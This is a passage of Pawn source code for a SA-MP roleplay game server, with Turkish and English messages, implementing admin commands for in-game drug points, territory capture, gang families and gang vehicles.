  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

	new string[128], choice[32], amount;
	if(sscanf(params, "s[32]d", choice, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /dedit [name] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Pot, Crack");
		return 1;
	}

	if(strcmp(choice,"pot",true) == 0)
	{
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(Points[h][Type] == 3)
			{
				Points[h][Stock] = amount;
				format(string, sizeof(string), " ALINABILIR POT: %d gram.", Points[h][Stock]);
				UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, " You have successfully changed the Drug House available pot!");
			}
		}
	}
	else if(strcmp(choice,"crack",true) == 0)
	{
		for(new h = 0; h < sizeof(Points); h++)
		{
			if(Points[h][Type] == 4)
			{
				Points[h][Stock] = amount;
				format(string, sizeof(string), " ALINABILIR CRACK: %d gram.", Points[h][Stock]);
				UpdateDynamic3DTextLabelText(Points[h][TextLabel], COLOR_YELLOW, string);
				SendClientMessage(playerid, COLOR_WHITE, " You have successfully changed the Crack Lab available crack!");
			}
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GREY, "	Not a valid name.");
		return 1;
	}
	return 1;
}

CMD:adestroyplant(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 		{
  			SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
   		}

		new
			iTargetID;

		if(sscanf(params, "u", iTargetID)) {
			SendClientMessage(playerid, COLOR_GRAD2, "KULLANIM: /adestroyplant [Oyuncu ID/Ýsim]");
		}
		else if(IsPlayerConnected(iTargetID)) {

			new
				szMessage[47 + MAX_PLAYER_NAME];

			format(szMessage, sizeof(szMessage), "You have destroyed %s's weed plant (%i grams).", GetPlayerNameEx(iTargetID), PlayerInfo[iTargetID][pWeedGrowth]);
			SendClientMessage(playerid, COLOR_GREY, szMessage);

			format(szMessage, sizeof(szMessage), "Admin %s has destroyed your weed plant (%i grams).", GetPlayerNameEx(playerid), PlayerInfo[iTargetID][pWeedGrowth]);
			SendClientMessage(iTargetID, COLOR_GREY, szMessage);

			if(IsValidDynamicObject(PlayerInfo[playerid][pWeedObject])) {
				DestroyDynamicObject(PlayerInfo[playerid][pWeedObject]);
				PlayerInfo[playerid][pWeedObject] = 0;
			}
		}
		else SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
	}
	else SendClientMessage(playerid, COLOR_GREY, "Bu komutu kullanmaya yetkin yok.");
	return 1;
}
/* Deaktif */
CMD:elegecirasffafs(playerid, params[])
{
	new string[128];

	if(AdminDuty[playerid] == 1)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak iþbaþýndayken  bu komutu kullanamazsýn.");
		return 1;
	}

	new mypoint = -1;
	if(GetPVarInt(playerid,"Injured") == 1)
		return SendClientMessage(playerid, COLOR_GRAD1, " Yaralýyken point'i ele geçiremezsin!");

	if(PlayerInfo[playerid][pGang] == 255)
		return SendClientMessage(playerid, COLOR_GRAD2, "Bir aileden deðilsin.");

	if(PlayerInfo[playerid][pRank] < 5)
		return SendClientMessage(playerid, COLOR_GRAD1, "Ele geçirmek için en az Rank 5 olmalýsýn!");

	for (new i=0; i<MAX_POINTS; i++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 1.0, Points[i][Pointx], Points[i][Pointy], Points[i][Pointz])) mypoint = i;
	}

	if(mypoint == -1)
		return SendClientMessage(playerid, COLOR_GRAD1, "Ele geçirilebilecek bir yerde deðilsin!");

	if(Points[mypoint][Vulnerable] > 0 || Points[mypoint][Vulnerable] == -1)
		return SendClientMessage(playerid, COLOR_GRAD1, " Bu point ele geçirmek için müsait deðil.");

	if(Points[mypoint][TimeToClaim])
		return SendClientMessage(playerid, COLOR_GRAD1, " Bu point zaten ele geçiriliyor!");

	Points[mypoint][PointBarID] = CreateProgressBar(258.00, 137.00, 131.50, 3.19, COLOR_GREEN, 100.0);
	SetProgressBarValue(Points[mypoint][PointBarID], 100.0);
	ShowProgressBarForPlayer(playerid, Points[mypoint][PointBarID]);
	format(string,sizeof(string), " %s adlý kiþi point'i ele geçirmeye çalýþýyor.", GetPlayerNameEx(playerid));
	ProxDetector(70.0, playerid, string, COLOR_RED,COLOR_RED,COLOR_RED,COLOR_RED,COLOR_RED);
	GetPlayerPos(playerid, Points[mypoint][Capturex], Points[mypoint][Capturey], Points[mypoint][Capturez]);

	Points[mypoint][ClaimerId] = playerid;
	Points[mypoint][TimeToClaim] = 1;
	Points[mypoint][TimeLeft] = 10;
	SetTimerEx("ProgressTimer", 1000, 0, "d", mypoint);
	return 1;
}

CMD:pointsinirlari(playerid, params[])
{
	if(isnull(params))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /pointlerinirlari [point]");
		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Point alanýný iþaretleyecek.");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: FBS (Fosil Benzincilik Þirketi) | MA1 (Materyal alýmý 1) | UF (Uyuþturucu Fabrikasý)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: MF1 (Materyal Fabrikasý 1) | UE (Uyuþturucu Evi) | MP2 (Materyal Alýmý 2)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: CL (Crack Laboratuvar) | MF2 (Materyal Fabrikasý 2) | TS (Taþýmacýlýk Þirketi)");
		return 1;
	}

	if(strcmp(params,"fbs",true) == 0)
	{
	    if(IsBoundsShowingFFC[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[0], 0xFF00008C); // FFC
			IsBoundsShowingFFC[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Fossil Fuel Company are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[0]); // FFC
			IsBoundsShowingFFC[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Fossil Fuel Company are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"ma1",true) == 0)
	{
	    if(IsBoundsShowingMP1[playerid] == 0)
		{
			GangZoneShowForPlayer(playerid, pointboundaries[1], 0xFF00008C); // MP1
			IsBoundsShowingMP1[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 1 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[1]); // MP1
			IsBoundsShowingMP1[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 1 are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"uf",true) == 0)
	{
	    if(IsBoundsShowingDF[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[8], 0xFF00008C); // DF
			IsBoundsShowingDF[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug Factory are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[8]); // DF
			IsBoundsShowingDF[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug Factory are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mf1",true) == 0)
	{
	    if(IsBoundsShowingMF1[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[2], 0xFF00008C); // MF1
			IsBoundsShowingMF1[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 1 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[2]); // MF1
			IsBoundsShowingMF1[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 1 are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"ue",true) == 0)
	{
	    if(IsBoundsShowingDH[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[6], 0xFF00008C); // DH
			IsBoundsShowingDH[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug House are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[6]); // DH
			IsBoundsShowingDH[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Drug House are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"ma2",true) == 0)
	{
	    if(IsBoundsShowingMP2[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[3], 0xFF00008C); // MP2
			IsBoundsShowingMP2[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 2 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[3]); // MP2
			IsBoundsShowingMP2[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Pickup 2 are now from your radar and map.");
		}
	}
	else if(strcmp(params,"cl",true) == 0)
	{
	    if(IsBoundsShowingCL[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[7], 0xFF00008C); // CL
			IsBoundsShowingCL[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Crack Lab are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[7]); // CL
			IsBoundsShowingCL[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Crack Lab are now removed from your radar and map.");
		}
	}
	else if(strcmp(params,"mf2",true) == 0)
	{
	    if(IsBoundsShowingMF2[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[4], 0xFF00008C); // MF2
			IsBoundsShowingMF2[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 2 are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[4]); // MF2
			IsBoundsShowingMF2[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Materials Factory 2 are now indicated on your radar and map in red.");
		}
	}
	else if(strcmp(params,"ts",true) == 0)
	{
	    if(IsBoundsShowingAEC[playerid] == 0)
	    {
			GangZoneShowForPlayer(playerid, pointboundaries[5], 0xFF00008C); // AEC
			IsBoundsShowingAEC[playerid] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Auto Export Company are now indicated on your radar and map in red.");
		}
		else
		{
			GangZoneHideForPlayer(playerid, pointboundaries[5]); // AEC
			IsBoundsShowingAEC[playerid] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "The point boundaries for Auto Export Company are now removed from your radar and map");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD1, "Yanlýþ point ismi.");
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /pointlerinirlari [point]");
		SendClientMessage(playerid, COLOR_WHITE,"IPUCU: Point alanýný iþaretleyecek.");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: FBS (Fosil Benzincilik Þirketi) | MA1 (Materyal alýmý 1) | UF (Uyuþturucu Fabrikasý)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: MF1 (Materyal Fabrikasý 1) | UE (Uyuþturucu Evi) | MP2 (Materyal Alýmý 2)");
		SendClientMessage(playerid, COLOR_GRAD3, "Points: CL (Crack Laboratuvar) | MF2 (Materyal Fabrikasý 2) | TS (Taþýmacýlýk Þirketi)");
	}
	return 1;
}

CMD:pointsinirlarikapat(playerid, params[])
{
	GangZoneHideForPlayer(playerid, pointboundaries[0]); // FFC
	GangZoneHideForPlayer(playerid, pointboundaries[1]); // MP1
	GangZoneHideForPlayer(playerid, pointboundaries[2]); // MF1
	GangZoneHideForPlayer(playerid, pointboundaries[3]); // MP2
	GangZoneHideForPlayer(playerid, pointboundaries[4]); // MF2
	GangZoneHideForPlayer(playerid, pointboundaries[5]); // AEC
	GangZoneHideForPlayer(playerid, pointboundaries[6]); // DH
	GangZoneHideForPlayer(playerid, pointboundaries[7]); // CL
	GangZoneHideForPlayer(playerid, pointboundaries[8]); // DF
	IsBoundsShowingFFC[playerid] = 0;
	IsBoundsShowingMP1[playerid] = 0;
	IsBoundsShowingMF1[playerid] = 0;
	IsBoundsShowingMP2[playerid] = 0;
	IsBoundsShowingMF2[playerid] = 0;
	IsBoundsShowingAEC[playerid] = 0;
	IsBoundsShowingDH[playerid] = 0;
	IsBoundsShowingCL[playerid] = 0;
	IsBoundsShowingDF[playerid] = 0;
 	SendClientMessage(playerid, COLOR_WHITE, "Harita ve radarýndaki point sýnýrlarý kaldýrýldý");
	return 1;
}

CMD:pointler(playerid, params[])
{
	new string[128];

	for(new i; i < MAX_POINTS; i++)
	{
		if(Points[i][Type] >= 0)
		{
		    if(Points[i][Vulnerable] == -1)
		    {
		        format(string, sizeof(string), "Ýsim: %s | Sahibi: %s | Ele Geçiren: %s | Saat: Geçici olarak pasif", Points[i][Name],Points[i][Owner],Points[i][CapperName]);
		    }
		    else
		    {
				format(string, sizeof(string), "Ýsim: %s | Sahibi: %s | Ele Geçiren: %s | Saat: %d", Points[i][Name],Points[i][Owner],Points[i][CapperName],Points[i][Vulnerable]);
			}
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
	}
	return 1;
}

CMD:fedit(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new family, x_job[64], x_hq[64], ammount, string[128];
		if(sscanf(params, "is[64]s[64]", family, x_job, x_hq))
		{
			SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fedit [family] [name] [amount]");
			SendClientMessage(playerid, COLOR_GREY, "Kullanýlabilir Isimler: Leader, MaxSkins, Skin1, Skin2, Skin3, Skin4, Skin5, Skin6, Skin7, Skin8");
			return 1;
		}
        ammount = strval(x_hq);
		if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   Aile numarasý yalnýzca 1 ile 14 arasýnda olabilir!"); return 1; }
		family -= 1;

		if(strcmp(x_job,"leader",true) == 0)
		{
			if(strlen(x_hq) >= 20)
			{
				SendClientMessage(playerid, COLOR_GRAD1, "That leader name is too long, please refrain from using more than 20 characters.");
				return 1;
			}
			strcpy(FamilyInfo[family][FamilyLeader], x_hq, MAX_PLAYER_NAME);
			format(string, sizeof(string), "You have changed '%s' leader name to %s.", FamilyInfo[family][FamilyName], x_hq);
			SendClientMessage(playerid, COLOR_WHITE, string);
			SaveFamilies();
			return 1;
		}
		else if(strcmp(x_job,"maxskins",true) == 0)
		{
			if(ammount > 8) return SendClientMessage(playerid, COLOR_WHITE, "You can't set the maxskins more than 8.");
			if(ammount == 7)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
			}
			if(ammount == 6)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
			}
			if(ammount == 5)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
			}
			if(ammount == 4)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
			}
			if(ammount == 3)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
			}
			if(ammount == 2)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
			}

			if(ammount == 1)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
				FamilyInfo[family][FamilySkins][1] = 0;
			}
			if(ammount == 0)
			{
				FamilyInfo[family][FamilySkins][7] = 0;
				FamilyInfo[family][FamilySkins][6] = 0;
				FamilyInfo[family][FamilySkins][5] = 0;
				FamilyInfo[family][FamilySkins][4] = 0;
				FamilyInfo[family][FamilySkins][3] = 0;
				FamilyInfo[family][FamilySkins][2] = 0;
				FamilyInfo[family][FamilySkins][1] = 0;
				FamilyInfo[family][FamilySkins][0] = 0;
			}

			FamilyInfo[family][FamilyMaxSkins] = ammount;
			format(string, sizeof(string), "You have changed '%s' max skins amount to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin1",true) == 0)
		{
			FamilyInfo[family][FamilySkins][0] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #1 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin2",true) == 0)
		{
			FamilyInfo[family][FamilySkins][1] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #2 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin3",true) == 0)
		{
			FamilyInfo[family][FamilySkins][2] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #3 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin4",true) == 0)
		{
			FamilyInfo[family][FamilySkins][3] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #4 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin5",true) == 0)
		{
			FamilyInfo[family][FamilySkins][4] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #5 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin6",true) == 0)
		{
			FamilyInfo[family][FamilySkins][5] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #6 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin7",true) == 0)
		{
			FamilyInfo[family][FamilySkins][6] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #7 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else if(strcmp(x_job,"skin8",true) == 0)
		{
			FamilyInfo[family][FamilySkins][7] = ammount;
			format(string, sizeof(string), "You have changed '%s' skin #8 to %d.", FamilyInfo[family][FamilyName], ammount);
			SendClientMessage(playerid, COLOR_WHITE, string);
		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "	Not a valid name.");
			return 1;
		}
		SaveFamilies();
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "   You're not an Admin!");
		return 1;
	}
	return 1;
}

CMD:fcreate(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 6) {
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new string[128], family, giveplayerid;
		if(sscanf(params, "du", family, giveplayerid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fcreate [FamilyNr] [Oyuncu ID/Ýsim]");
		if(family < 1 || family > 14) { SendClientMessage(playerid, COLOR_GREY, "   Aile slotu 1'den düþük, 14'den yüksek olamaz."); return 1; }

		if(IsPlayerConnected(giveplayerid))
		{
			if(FamilyInfo[family-1][FamilyTaken] == 1)
			{
				SendClientMessage(playerid, COLOR_GREY, "   That Family Slot is already taken!");
				return 1;
			}

			format(string, sizeof(string), "* You've made %s the Leader of Family Slot %d.",GetPlayerNameEx(giveplayerid),family);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), "* Admin %s has made you a Family Leader.", GetPlayerNameEx(playerid));
			SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, string);

			new sendername[MAX_PLAYER_NAME];
			GetPlayerName(giveplayerid, sendername, sizeof(sendername));
			format(string, sizeof(string), "%s",sendername);
			strmid(FamilyInfo[family-1][FamilyLeader], string, 0, strlen(string), 24);
			FamilyInfo[family-1][FamilyMembers] ++;
			FamilyInfo[family-1][FamilyTaken] = 1;
			PlayerInfo[giveplayerid][pGang] = family-1;
			PlayerInfo[giveplayerid][pRank] = 6;
			SaveFamilies();

		}
		else
		{
			SendClientMessage(playerid, COLOR_GREY, "Geçersiz oyuncu.");
			return 1;
		}
	}
	return 1;
}

CMD:fdelete(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 6)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

		new family;
		if(sscanf(params, "d", family))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /fdelete [familyid]");

		if(family < 1 || family > 14) { SendClientMessage(playerid, COLOR_GREY, "   Aile slotu 1'den düþük, 14'den yüksek olamaz."); return 1; }
		if(FamilyInfo[family-1][FamilyTaken] != 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "    Bu aile slotu alýnmýþ deðil.");
			return 1;
		}
		ClearFamily(family-1);
		SaveFamilies();
	}
	return 1;
}

CMD:pedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkin yok.");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

	new string[128], hours;
	if(sscanf(params, "d", hours))
	{
		SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /pedit [hours]");
		SendClientMessage(playerid, COLOR_GREY,"IPUCU: Point süresini ayarlamak için pointin yakýnýnda dur.");
		return 1;
	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			if(hours < 1|| hours > 24)
			{
				SendClientMessage(playerid, COLOR_GREY, "Point süresini 1 den az, 24 den fazla olarak ayarlayamazsýn.");
			}
			else if(hours >= 1|| hours <= 24)
			{
				format(string, sizeof(string), "Pointin süresini %d saate ayarladýn!", hours);
				Points[h][Vulnerable] = hours;
				SendClientMessage(playerid, COLOR_WHITE, string);
				UpdatePoints();
			}
		}
	}
	return 1;
}

CMD:disablepoint(playerid, params[])
{ // TEMPORARY COMMAND - REMOVE LATER
	if(PlayerInfo[playerid][pAdmin] < 5)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkin yok.");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}
	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			strmid(Points[h][Owner], "Nobody", 0, 32, 32);
			strmid(Points[h][CapperName], "Nobody", 0, 32, 32);
			Points[h][Vulnerable] = -1;
			SendClientMessage(playerid, COLOR_WHITE, "Pointi pasif hale getirdin.");
			UpdatePoints();
		}
	}
	return 1;
}

CMD:pointfix(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "Bu komutu kullanma yetkin yok.");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
		return 1;
   	}

	for(new h = 0; h < sizeof(Points); h++)
	{
		if(IsPlayerInRangeOfPoint(playerid, 3.0, Points[h][Pointx], Points[h][Pointy], Points[h][Pointz]))
		{
			Points[h][TimeToClaim] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "Pointi fixledin, oyuncular artýk ele geçirmeye çalýþabilir!.");
			UpdatePoints();
			return 1;
		}
	}
	SendClientMessage(playerid, COLOR_GREY, "Hata: Fixlemek için ele geçirme noktasýnda olmalýsýn.");
	return 1;
}

CMD:creategvehicle(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 6) {
		new
			string[128],
			family,
			modelid,
			color1,
			color2;

		if(sscanf(params, "dddd", family, modelid, color1, color2))
			return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /creategvehicle [aileid] [modelid] [color 1] [color 2]");

	   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	    }

	   	if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   Aile numarasý yalnýzca 1 ile 14 arasýnda olabilir!"); return 1; }
		family -= 1;
		if(FamilyInfo[family][FamilyTaken] != 1)
		{
			SendClientMessage(playerid, COLOR_GREY, "   That FamilyNr hasn't been Taken yet!");
			return 1;
		}
		if(color1 < 0 || color1 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Renk numarasý 0'dan düþük, 255'ten fazla olamaz."); return 1; }
		if(color2 < 0 || color2 > 255) { SendClientMessage(playerid, COLOR_GREY, "   Renk numarasý 0'dan düþük, 255'ten fazla olamaz."); return 1; }
		if(modelid < 400 || modelid > 611) { SendClientMessage(playerid, COLOR_GREY, "Araç numarasý 400'ün altýnda yada 611'in üzerinde olamaz!"); return 1; }
		new gangvehicleid = GetGangFreeVehicleId(family);
		if(gangvehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "Hata: Bu aile daha fazla araç alamaz.");
		new Float:X,Float:Y,Float:Z;
	 	GetPlayerPos(playerid,X,Y,Z);
	  	new Float:Angle;
	   	GetPlayerFacingAngle(playerid,Angle);
	   	new car = CreateGangVehicle(family, gangvehicleid, modelid, X, Y, Z, Angle, color1, color2, 0);
	   	if(car == INVALID_VEHICLE_ID) {
	 		SendClientMessage(playerid, COLOR_GREY, "Hata: Birþeyler yalnýþ gitti ve araç yaratýlmadý.");
		}
	 	else
	  	{
	   		format(string, sizeof(string), "Araç baþarýlý bir þekilde yaratýldý ID %d.", car);
	    	SendClientMessage(playerid, COLOR_GRAD1, string);
		    SaveFamiliesHQ();
		}
	}
	return 1;
}

CMD:destroygvehicle(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 1 && PlayerInfo[playerid][pGangMod] > 0 || PlayerInfo[playerid][pAdmin] >= 6) {
		new
			family,
			vehicleid;
		if(sscanf(params, "dd", family, vehicleid)) return SendClientMessage(playerid, COLOR_WHITE, "KULLANIM: /destroygvehicle [aile id] [Araç ID]");

	   	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	 	{
	  		SendClientMessage(playerid,COLOR_WHITE, "Admin olarak görevde deðilsin.");
			return 1;
	   	}

	    if(family < 1 || family > MAX_FAMILY) { SendClientMessage(playerid, COLOR_GREY, "   Aile numarasý yalnýzca 1 ile 14 arasýnda olabilir!"); return 1; }
		family -= 1;
		new gangvehicleid = GetGangVehicle(family, vehicleid);
		if(gangvehicleid == -1) return SendClientMessage(playerid, COLOR_GREY, "Bu ailenin bir aracý yok.");
		DestroyGangVehicle(family, gangvehicleid);
		SaveFamiliesHQ();
	}
	return 1;
}

#if defined TREASURE_HUNT_ENABLED
CMD:gotohuntpos(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		SetPlayerPos(playerid, fTreasureHuntLS[iHuntLocation][0], fTreasureHuntLS[iHuntLocation][1], fTreasureHuntLS[iHuntLocation][2]);

		SendClientMessage(playerid, COLOR_WHITE, "Treasure hunt yerine teleport oldun.");
	}
	return 1;
}

CMD:resethuntpos(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] >= 5) {
		SetRandomHuntPos();

		SendClientMessage(playerid, COLOR_WHITE, "Treasure hunt etkinliðinin yerini deðiþtirdin.");
	}
	return 1;
}
#endif

CMD:ailearacibul(playerid, params[])
{
